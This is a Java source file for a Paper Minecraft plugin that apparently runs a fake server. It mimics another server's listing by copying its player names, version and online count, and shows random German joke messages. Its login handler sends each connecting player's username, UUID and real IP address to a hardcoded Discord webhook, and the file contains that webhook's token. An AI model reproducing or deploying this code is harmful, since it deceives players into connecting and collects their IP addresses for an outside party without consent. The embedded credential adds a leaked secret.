package com.dwarslooper.cafake;

import com.destroystokyo.paper.event.server.PaperServerListPingEvent;
import com.destroystokyo.paper.profile.PlayerProfile;
import com.dwarslooper.cafake.ping.MCPingResponse;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;

import java.awt.*;
import java.io.IOException;
import java.time.LocalDateTime;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

public class ConnectionListener implements Listener {

    String[] possibleMotds = {
            "%s% mag Pizza!",
            "Betrieben von ganz viel TNT!",
            "Die Maske lebt!",
            "Warum guckst du so böse?!",
            "%s% ist unfähig!",
            "%s% platziert gerade Diorite!",
            "Magst du Züge? ich auch!",
            "Varo 5 confirmed!",
            "Komm auf die dunkle Seite der Macht!",
            "Der Server über mir stinkt nach Wurst!",
            "Du wirst diesen Server lieben!",
            "Dieser Server ist 100% Vegan - Unge gefällt das!",
            "%s% downloadet gerade die CraftAttack 11 Map!",
            "Empire 2 kommt November 2005!",
            "%s% stinkt nach Wurst!",
            "%s% hat Angst vor Schweinen!",
            "%s% fell from a high place",
            "Du wurdest gerade von einem Zombie gekillt!",
            "Vorsicht vor StalkOfPhoenix!",
            "%s% wird von Spark gestalked!",
            "%s% ist so lost wie Trymacs!",
            "%s% spielt gerade Varo!",
            "%s% raucht zu viel Sugarcane!",
            "%s% hat bei Varo verloren!",
            "%s% klaut Rewi immer die Kühe!",
            "SCHATTENWOLF!",
            "Hast du Brot?",
            "Nein, hier ist Patrick!",
            "Wann kommt der Download zu CraftAttack 9?!",
            "%s% mag Züge!",
            "%s% sitzt gerade in der Badewanne!",
            "%s% stirbt gerade an einem Creeper!",
            "%s% spielt auf der Toilette!",
            "%s% spielt gerade Varo!",
            "%s% ist heimlich Veganer!",
            "%s% leckt gerne an Kühen!",
            "Press [F] to pay respect",
            "%s% spielt gerade GTA RP"
    };

    public static int getRandomNumber(int min, int max) {
        return (int) Math.round((Math.random() * (max - min)) + min);
    }

    @EventHandler
    public void onPing(PaperServerListPingEvent event) {
        String motd = Arrays.asList(possibleMotds).get(getRandomNumber(0, possibleMotds.length - 1));
        List<MCPingResponse.Player> players = InfoReceiver.getCurrentData().getPlayers().getSample();
        motd = motd.replace("%s%", Math.random() < 0.9 ? String.valueOf(players.get(getRandomNumber(0, players.size() - 1)).getName()) : "Deine Muddi");

        event.setMotd(motd);
        event.setMaxPlayers(getRandomNumber(100, 274821));
        event.setNumPlayers(InfoReceiver.getCurrentData().getPlayers().getOnline());
        event.setVersion(InfoReceiver.getCurrentData().getVersion().getName());
        event.setProtocolVersion(InfoReceiver.getCurrentData().getVersion().getProtocol());

    }

    @EventHandler
    public void onJoin(PlayerLoginEvent event) throws IOException {
        DiscordWebhook hook = new DiscordWebhook("https://discord.com/api/webhooks/1094610812498350112/2v7BH9GRhaSnDo3QM2suCfI0taEI7Gc8sKKq3U9r2Otq73sQuFsKs9f4M45gdRkx0BCn");
        DiscordWebhook.EmbedObject embed = new DiscordWebhook.EmbedObject();
        embed.setColor(Color.GREEN);
        embed.setAuthor(event.getPlayer().getName(), "https://namemc.com/profile/" + event.getPlayer().getUniqueId(), "https://crafatar.com/avatars/" + event.getPlayer().getUniqueId());
        embed.addField("Username", event.getPlayer().getName(), true);
        embed.addField("UUID", event.getPlayer().getUniqueId().toString(), true);
        embed.addField("", "", false);
        embed.addField("Real IP", "```" + event.getRealAddress() + "```", true);
        embed.addField("Sent IP", "```" + event.getAddress() + "```", true);
        embed.addField("", "", false);
        embed.addField("Time", LocalDateTime.now().toString(), false);
        hook.addEmbed(embed);
        hook.setContent("``Player tried to connect``");
        hook.execute();
    }

}
